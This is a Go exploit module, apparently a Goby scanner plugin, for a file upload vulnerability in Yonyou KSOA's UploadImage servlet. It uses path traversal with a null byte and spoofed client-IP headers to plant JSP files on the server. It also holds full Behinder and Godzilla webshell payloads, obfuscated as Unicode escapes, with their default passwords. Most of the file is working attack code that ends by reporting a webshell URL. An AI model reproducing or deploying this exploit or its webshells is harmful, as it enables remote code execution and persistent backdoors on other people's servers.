package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yonyou KSOA com.sksoft.v8.desktop.UploadImage File Upload Vulnerability",
    "Description": "<p>Yonyou Space KSOA is a new generation product developed under the guidance of SOA concept, which is a unified IT infrastructure launched based on the cutting-edge IT needs of circulation enterprises.</p><p>Yonyou KSOA has a file upload vulnerability, which allows attackers to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "yonyou-Time-and-Space-KSOA",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2022-05-25",
    "PostTime": "2024-02-01",
    "Author": "su18@javaweb.org",
    "FofaQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" || body=\"com.sksoft.v8.cb.RandomImageGenerator\" || (header=\"/login.jsp\" && header=\"Apache-Coyote\") || (banner=\"/login.jsp\" && banner=\"Apache-Coyote\")",
    "GobyQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" || body=\"com.sksoft.v8.cb.RandomImageGenerator\" || (header=\"/login.jsp\" && header=\"Apache-Coyote\") || (banner=\"/login.jsp\" && banner=\"Apache-Coyote\")",
    "Level": "3",
    "Impact": "<p>Yonyou KSOA has a file upload vulnerability, which allows attackers to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://security.yonyou.com/\">https://security.yonyou.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "iasodjw.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "HW-2023"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "用友时空 KSOA com.sksoft.v8.desktop.UploadImage 文件上传漏洞",
            "Product": "用友-时空KSOA",
            "Description": "<p>用友时空 KSOA 是建立在 SOA 理念指导下研发的新一代产品，是根据流通企业前沿的IT需求推出的统一的IT基础架构。</p><p>用友时空 KSOA 存在文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>厂商已发布漏洞修复程序，请及时联系厂商修复：<a href=\"https://security.yonyou.com/\" target=\"_blank\">https://security.yonyou.com/</a></p>",
            "Impact": "<p>用友 KSOA 存在文件上传执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Yonyou KSOA com.sksoft.v8.desktop.UploadImage File Upload Vulnerability",
            "Product": "yonyou-Time-and-Space-KSOA",
            "Description": "<p>Yonyou Space KSOA is a new generation product developed under the guidance of SOA concept, which is a unified IT infrastructure launched based on the cutting-edge IT needs of circulation enterprises.</p><p>Yonyou KSOA has a file upload vulnerability, which allows attackers to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://security.yonyou.com/\" target=\"_blank\">https://security.yonyou.com/</a></p>",
            "Impact": "<p>Yonyou KSOA has a file upload vulnerability, which allows attackers to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10479"
}`

	sendPayloadDWVOOOOOLL := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		uploadConfig := httpclient.NewPostRequestConfig("/servlet/com.sksoft.v8.desktop.UploadImage?fileextr=.&rpath=../webapps/ROOT/" + filename + "%00")
		uploadConfig.FollowRedirect = false
		uploadConfig.VerifyTls = false
		uploadConfig.Header.Store("Content-Type", "application/octet-stream")
		uploadConfig.Header.Store("x-forwarded-for", "127.0.0.1")
		uploadConfig.Header.Store("x-originating-ip", "127.0.0.1")
		uploadConfig.Header.Store("x-remote-ip", "127.0.0.1")
		uploadConfig.Header.Store("x-remote-addr", "127.0.0.1")
		uploadConfig.Data = content
		_, err := httpclient.DoHttpRequest(hostInfo, uploadConfig)
		if err != nil {
			return nil, err
		}
		checkFileConfig := httpclient.NewGetRequestConfig("/" + filename)
		checkFileConfig.FollowRedirect = false
		checkFileConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, checkFileConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(6)
			filename := goutils.RandomHexString(6) + ".jsp"
			content := `<% out.println("` + checkString + `");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>`
			checkResponse, _ := sendPayloadDWVOOOOOLL(u, filename, content)
			return checkResponse != nil && strings.Contains(checkResponse.RawBody, checkString)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			filename := goutils.RandomHexString(6)+".jsp"
			content := goutils.B2S(stepLogs.Params["content"])
			if attackType == "behinder" {
				/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
				content = `<%@page import="\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.*,\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.*,\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0073\u0070\u0065\u0063.*"%><%!\u0063\u006c\u0061\u0073\u0073 \u0055 \u0065\u0078\u0074\u0065\u006e\u0064\u0073 \u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072{\u0055(\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 \u0063){\u0073\u0075\u0070\u0065\u0072(\u0063);}\u0070\u0075\u0062\u006c\u0069\u0063 \u0043\u006c\u0061\u0073\u0073 \u0067(\u0062\u0079\u0074\u0065 []\u0062){\u0072\u0065\u0074\u0075\u0072\u006e \u0073\u0075\u0070\u0065\u0072.\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073(\u0062,\u0030,\u0062.\u006c\u0065\u006e\u0067\u0074\u0068);}}%><%\u0069\u0066 (\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064().\u0065\u0071\u0075\u0061\u006c\u0073("\u0050\u004f\u0053\u0054")){\u0053\u0074\u0072\u0069\u006e\u0067 \u006b="\u0065\u0034\u0035\u0065\u0033\u0032\u0039\u0066\u0065\u0062\u0035\u0064\u0039\u0032\u0035\u0062";\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0070\u0075\u0074\u0056\u0061\u006c\u0075\u0065("\u0075",\u006b);\u0043\u0069\u0070\u0068\u0065\u0072 \u0063=\u0043\u0069\u0070\u0068\u0065\u0072.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u0041\u0045\u0053");\u0063.\u0069\u006e\u0069\u0074(\u0032,\u006e\u0065\u0077 \u0053\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079\u0053\u0070\u0065\u0063(\u006b.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(),"\u0041\u0045\u0053"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
			} else if attackType == "godzilla" {
				// 哥斯拉 pass key
				content = `<%! \u0053\u0074\u0072\u0069\u006e\u0067 \u0078\u0063="\u0033\u0063\u0036\u0065\u0030\u0062\u0038\u0061\u0039\u0063\u0031\u0035\u0032\u0032\u0034\u0061"; \u0053\u0074\u0072\u0069\u006e\u0067 \u0070\u0061\u0073\u0073="\u0070\u0061\u0073\u0073"; \u0053\u0074\u0072\u0069\u006e\u0067 \u006d\u0064\u0035=\u006d\u0064\u0035(\u0070\u0061\u0073\u0073+\u0078\u0063); \u0063\u006c\u0061\u0073\u0073 \u0058 \u0065\u0078\u0074\u0065\u006e\u0064\u0073 \u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072{\u0070\u0075\u0062\u006c\u0069\u0063 \u0058(\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 \u007a){\u0073\u0075\u0070\u0065\u0072(\u007a);}\u0070\u0075\u0062\u006c\u0069\u0063 \u0043\u006c\u0061\u0073\u0073 \u0051(\u0062\u0079\u0074\u0065[] \u0063\u0062){\u0072\u0065\u0074\u0075\u0072\u006e \u0073\u0075\u0070\u0065\u0072.\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073(\u0063\u0062, \u0030, \u0063\u0062.\u006c\u0065\u006e\u0067\u0074\u0068);} }\u0070\u0075\u0062\u006c\u0069\u0063 \u0062\u0079\u0074\u0065[] \u0078(\u0062\u0079\u0074\u0065[] \u0073,\u0062\u006f\u006f\u006c\u0065\u0061\u006e \u006d){ \u0074\u0072\u0079{\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0043\u0069\u0070\u0068\u0065\u0072 \u0063=\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0043\u0069\u0070\u0068\u0065\u0072.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u0041\u0045\u0053");\u0063.\u0069\u006e\u0069\u0074(\u006d?\u0031:\u0032,\u006e\u0065\u0077 \u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0073\u0070\u0065\u0063.\u0053\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079\u0053\u0070\u0065\u0063(\u0078\u0063.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(),"\u0041\u0045\u0053"));\u0072\u0065\u0074\u0075\u0072\u006e \u0063.\u0064\u006f\u0046\u0069\u006e\u0061\u006c(\u0073); }\u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065){\u0072\u0065\u0074\u0075\u0072\u006e \u006e\u0075\u006c\u006c; }} \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0053\u0074\u0072\u0069\u006e\u0067 \u006d\u0064\u0035(\u0053\u0074\u0072\u0069\u006e\u0067 \u0073) {\u0053\u0074\u0072\u0069\u006e\u0067 \u0072\u0065\u0074 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u006a\u0061\u0076\u0061.\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u004d\u0065\u0073\u0073\u0061\u0067\u0065\u0044\u0069\u0067\u0065\u0073\u0074 \u006d;\u006d = \u006a\u0061\u0076\u0061.\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u004d\u0065\u0073\u0073\u0061\u0067\u0065\u0044\u0069\u0067\u0065\u0073\u0074.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u004d\u0044\u0035");\u006d.\u0075\u0070\u0064\u0061\u0074\u0065(\u0073.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(), \u0030, \u0073.\u006c\u0065\u006e\u0067\u0074\u0068());\u0072\u0065\u0074 = \u006e\u0065\u0077 \u006a\u0061\u0076\u0061.\u006d\u0061\u0074\u0068.\u0042\u0069\u0067\u0049\u006e\u0074\u0065\u0067\u0065\u0072(\u0031, \u006d.\u0064\u0069\u0067\u0065\u0073\u0074()).\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067(\u0031\u0036).\u0074\u006f\u0055\u0070\u0070\u0065\u0072\u0043\u0061\u0073\u0065();} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {}\u0072\u0065\u0074\u0075\u0072\u006e \u0072\u0065\u0074; } \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0053\u0074\u0072\u0069\u006e\u0067 \u0062\u0061\u0073\u0065\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065(\u0062\u0079\u0074\u0065[] \u0062\u0073) \u0074\u0068\u0072\u006f\u0077\u0073 \u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e {\u0043\u006c\u0061\u0073\u0073 \u0062\u0061\u0073\u0065\u0036\u0034;\u0053\u0074\u0072\u0069\u006e\u0067 \u0076\u0061\u006c\u0075\u0065 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.\u0042\u0061\u0073\u0065\u0036\u0034");\u004f\u0062\u006a\u0065\u0063\u0074 \u0045\u006e\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0067\u0065\u0074\u0045\u006e\u0063\u006f\u0064\u0065\u0072", \u006e\u0075\u006c\u006c).\u0069\u006e\u0076\u006f\u006b\u0065(\u0062\u0061\u0073\u0065\u0036\u0034, \u006e\u0075\u006c\u006c);\u0076\u0061\u006c\u0075\u0065 = (\u0053\u0074\u0072\u0069\u006e\u0067)\u0045\u006e\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0065\u006e\u0063\u006f\u0064\u0065\u0054\u006f\u0053\u0074\u0072\u0069\u006e\u0067", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0062\u0079\u0074\u0065[].\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0045\u006e\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {\u0074\u0072\u0079 { \u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u0073\u0075\u006e.\u006d\u0069\u0073\u0063.\u0042\u0041\u0053\u0045\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065\u0072"); \u004f\u0062\u006a\u0065\u0063\u0074 \u0045\u006e\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065(); \u0076\u0061\u006c\u0075\u0065 = (\u0053\u0074\u0072\u0069\u006e\u0067)\u0045\u006e\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0065\u006e\u0063\u006f\u0064\u0065", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0062\u0079\u0074\u0065[].\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0045\u006e\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065\u0032) {}}\u0072\u0065\u0074\u0075\u0072\u006e \u0076\u0061\u006c\u0075\u0065; } \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0062\u0079\u0074\u0065[] \u0062\u0061\u0073\u0065\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065(\u0053\u0074\u0072\u0069\u006e\u0067 \u0062\u0073) \u0074\u0068\u0072\u006f\u0077\u0073 \u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e {\u0043\u006c\u0061\u0073\u0073 \u0062\u0061\u0073\u0065\u0036\u0034;\u0062\u0079\u0074\u0065[] \u0076\u0061\u006c\u0075\u0065 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.\u0042\u0061\u0073\u0065\u0036\u0034");\u004f\u0062\u006a\u0065\u0063\u0074 \u0064\u0065\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072", \u006e\u0075\u006c\u006c).\u0069\u006e\u0076\u006f\u006b\u0065(\u0062\u0061\u0073\u0065\u0036\u0034, \u006e\u0075\u006c\u006c);\u0076\u0061\u006c\u0075\u0065 = (\u0062\u0079\u0074\u0065[])\u0064\u0065\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0064\u0065\u0063\u006f\u0064\u0065", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0053\u0074\u0072\u0069\u006e\u0067.\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0064\u0065\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {\u0074\u0072\u0079 { \u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u0073\u0075\u006e.\u006d\u0069\u0073\u0063.\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072"); \u004f\u0062\u006a\u0065\u0063\u0074 \u0064\u0065\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065(); \u0076\u0061\u006c\u0075\u0065 = (\u0062\u0079\u0074\u0065[])\u0064\u0065\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0064\u0065\u0063\u006f\u0064\u0065\u0042\u0075\u0066\u0066\u0065\u0072", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0053\u0074\u0072\u0069\u006e\u0067.\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0064\u0065\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065\u0032) {}}\u0072\u0065\u0074\u0075\u0072\u006e \u0076\u0061\u006c\u0075\u0065; }%><%\u0074\u0072\u0079{\u0062\u0079\u0074\u0065[] \u0064\u0061\u0074\u0061=\u0062\u0061\u0073\u0065\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065(\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072(\u0070\u0061\u0073\u0073));\u0064\u0061\u0074\u0061=\u0078(\u0064\u0061\u0074\u0061, \u0066\u0061\u006c\u0073\u0065);\u0069\u0066 (\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0067\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064")==\u006e\u0075\u006c\u006c){\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064",\u006e\u0065\u0077 \u0058(\u0074\u0068\u0069\u0073.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072()).\u0051(\u0064\u0061\u0074\u0061));}\u0065\u006c\u0073\u0065{\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073",\u0064\u0061\u0074\u0061);\u006a\u0061\u0076\u0061.\u0069\u006f.\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d \u0061\u0072\u0072\u004f\u0075\u0074=\u006e\u0065\u0077 \u006a\u0061\u0076\u0061.\u0069\u006f.\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d();\u004f\u0062\u006a\u0065\u0063\u0074 \u0066=((\u0043\u006c\u0061\u0073\u0073)\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0067\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064")).\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065();\u0066.\u0065\u0071\u0075\u0061\u006c\u0073(\u0061\u0072\u0072\u004f\u0075\u0074);\u0066.\u0065\u0071\u0075\u0061\u006c\u0073(\u0070\u0061\u0067\u0065\u0043\u006f\u006e\u0074\u0065\u0078\u0074);\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u006d\u0064\u0035.\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006e\u0067(\u0030,\u0031\u0036));\u0066.\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067();\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u0062\u0061\u0073\u0065\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065(\u0078(\u0061\u0072\u0072\u004f\u0075\u0074.\u0074\u006f\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079(), \u0074\u0072\u0075\u0065)));\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u006d\u0064\u0035.\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006e\u0067(\u0031\u0036));} }\u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065){}
%>`
			}else if attackType =="custom"{
				filename = goutils.RandomHexString(6)+".jsp"
			}
			if resp, err := sendPayloadDWVOOOOOLL(expResult.HostInfo, filename, content); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				if attackType == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if attackType == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: jsp\n"
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
